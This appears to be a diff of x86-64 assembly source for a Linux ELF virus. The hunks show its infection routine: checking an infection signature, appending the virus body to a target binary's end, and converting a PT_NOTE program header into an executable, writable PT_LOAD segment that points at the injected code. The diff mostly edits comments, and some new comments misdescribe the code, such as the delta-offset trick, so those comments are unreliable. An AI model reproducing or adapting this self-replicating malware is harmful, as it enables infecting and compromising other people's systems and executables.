@@ -144,7 +144,7 @@ _start:
 			cmp byte [r15 + 148], 0x2						; check if target ELF is 64bit
 			jne .close_file
 		.is_infected:
-			cmp dword [r15 + 152], SIGNATURE				; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
+			cmp dword [r15 + 152], SIGNATURE				; check signature in [r15 + 152] ehdr.pad (0DRE)
 			jz .close_file   
 		mov r8, [r15 + 176]									; r8 now holds ehdr.phoff from [r15 + 176]
 		xor rbx, rbx										; initializing phdr loop counter in rbx
@@ -185,41 +185,41 @@ _start:
 			.append_virus:
 				; getting target EOF
 				mov rdi, r9									; r9 contains fd
-				mov rsi, 0									; seek offset 0
-				mov rdx, SEEK_END
+				mov rsi, 0									
+				mov rdx, SEEK_END							; seek to end of file
 				mov rax, SYS_LSEEK
 				syscall										; getting target EOF offset in rax
-				push rax									; saving target EOF
+				push rax									; saving it to stack
 
-				call .delta									; the age old trick
-				.delta:
-					pop rbp
-					sub rbp, .delta
+				call .delta									; getting delta between target EOF and current EOF
+				.delta:										
+					pop rbp									; rbp = target EOF
+					sub rbp, .delta							; rbp = target EOF - current EOF
 
 				; writing virus body to EOF
-				mov rdi, r9									; r9 contains fd
+				mov rdi, r9									; r9 contains target fd
 				lea rsi, [rbp + _start]						; loading _start address in rsi
 				mov rdx, _end - _start						; virus size
 				mov r10, rax								; rax contains target EOF offset from previous syscall
 				mov rax, SYS_PWRITE64
 				syscall
 
-				cmp rax, 0
+				cmp rax, 0						; if write failed, _end now
 				jbe .close_file
 
 			.patch_phdr:
-				mov dword [r15 + 208], PT_LOAD				; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
+				mov dword [r15 + 208], PT_LOAD				; patch phdr.type to PT_LOAD (1)
 				mov dword [r15 + 212], PF_R | PF_X | PF_W	; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4) | PF_W (2)
 				pop rax										; restoring target EOF offeset into rax
 				mov [r15 + 216], rax						; phdr.offset [r15 + 216] = target EOF offset
 				mov r13, [r15 + 48]							; storing target stat.st_size from [r15 + 48] in r13
-				add r13, 0xc000000							; adding 0xc000000 to target file size
+				add r13, 0xc000000							
 				mov [r15 + 224], r13						; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
 				mov qword [r15 + 256], 0x200000				; set phdr.align in [r15 + 256] to 2mb
 				add qword [r15 + 240], _end - _start + 5	; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
 				add qword [r15 + 248], _end - _start + 5	; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
 
-				mov rdi, r9									; fd
+				mov rdi, r9									; r9 contains target fd
 				mov rsi, r15								; rsi = r15 = stack buffer address
 				lea rsi, [r15 + 208]						; rsi = phdr = [r15 + 208]
 				mov dx, word [r15 + 198]					; ehdr.phentsize from [r15 + 198]
